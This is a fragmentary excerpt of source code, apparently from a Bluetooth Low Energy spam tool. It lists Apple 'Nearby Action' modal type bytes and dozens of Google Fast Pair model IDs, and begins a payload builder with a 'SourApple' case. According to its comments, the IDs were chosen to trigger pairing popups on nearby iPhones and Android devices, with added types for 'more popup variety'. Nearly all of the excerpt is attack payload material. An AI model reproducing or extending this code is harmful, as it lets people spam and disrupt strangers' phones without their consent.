...
const uint8_t IOS2[] = {0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27,
                        0x0b, 0x09, 0x02, 0x1e, 0x24, 0x19};
...
const DeviceType android_models[] = {
    ...
    // Expanded Fast Pair model IDs (each triggers a specific device's pairing popup).
    // Real device IDs sourced from public Fast Pair model lists; deduped vs. above.
    {0x72EF8D}, {0x0E30C3}, {0x000008}, {0x000009}, {0x002000}, {0x003000}, {0x003B41}, {0x003D8A},
    {0x005BC3}, {0x008F7D}, {0x00A168}, {0x00AA48}, {0x00AA91}, {0x00C95C}, {0x00FA72}, {0x0100F0},
    {0x011242}, {0x013D8A}, {0x01AA91}, {0x01C95C}, {0x01EEB4}, {0x02AA91}, {0x02C95C}, {0x02D815},
    {0x02E2A9}, {0x038F16}, {0x039F8F}, {0x03AA91}, {0x03C99C}, {0x050F0C}, {0x052CC7}, {0x0577B1},
    {0x057802}, {0x0582FD}, {0x058D08}, {0x05A9BC}, {0x2D7A23}, {0x72FB00}, {0xF00200}, {0xF0020E},
    {0xF00213}, {0x02DD4F}, {0x038CC7}, {0xF00300}, {0xF00301}, {0xF00302}, {0xF00303}, {0xF00304},
    {0xF00306}, {0xF00307}, {0xF00308}, {0xF00309}, {0xD5AB33}
};
...
BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, String customName = "") {
    ...
    switch (Type) {
        ...
        case SourApple: {
            ...
            packet[j++] = 0x05;
            packet[j++] = 0xC1;
            // Apple "Nearby Action" modal types. Added 0x13 (AppleTV AutoFill),
            // 0x19 (AppleTV Audio Sync), 0x0b (HomePod Setup), 0x0d (HomeKit AppleTV
            // Setup), 0x24 for more popup variety.
            const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01,
                                     0x06, 0x20, 0xc0, 0x13, 0x19, 0x0b, 0x0d, 0x24};
